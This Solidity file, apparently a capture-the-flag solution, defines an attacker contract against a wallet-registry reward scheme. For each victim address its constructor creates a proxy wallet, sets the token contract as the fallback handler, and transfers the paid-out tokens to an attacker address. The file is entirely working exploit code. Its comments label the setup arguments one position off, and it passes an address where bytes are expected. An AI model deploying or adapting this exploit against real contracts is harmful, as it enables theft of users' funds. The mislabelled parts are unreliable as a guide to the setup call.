// SPDX-License-Identifier: UNDEFINED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IWalletFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}

contract AttackerContract {
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    address[] victims;
    address walletFactory;
    address walletRegistry;
    IERC20 token;
    address masterCopy;
    address wallet;
    address attacker;

    constructor(
        address[] memory _victims,
        address _walletFactory,
        address _walletRegistry,
        address _masterCopy,
        address _tokenAddress,
        address _attacker
    ) {
        victims = _victims;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        token = IERC20(_tokenAddress);
        masterCopy = _masterCopy;
        attacker = _attacker;

        for (uint8 index; index < victims.length; index++) {
            address[] memory _v = new address[](1);
            _v[0] = victims[index];
            bytes memory data = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                _v,
                uint256(1),     // Owners
                address(0),     // threshold
                address(0),     // To 
                address(token), // fallbackHandler
                address(0),     // paymentToken
                uint256(0),     // paymentValue
                address(0)      // paymentReceiver
            );
            wallet = IWalletFactory(walletFactory).createProxyWithCallback(
                masterCopy,
                data,
                0,
                walletRegistry
            );
            (bool success, bytes memory res) = address(wallet).call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    attacker,
                    TOKEN_PAYMENT
                )
            );
        }
    }
}
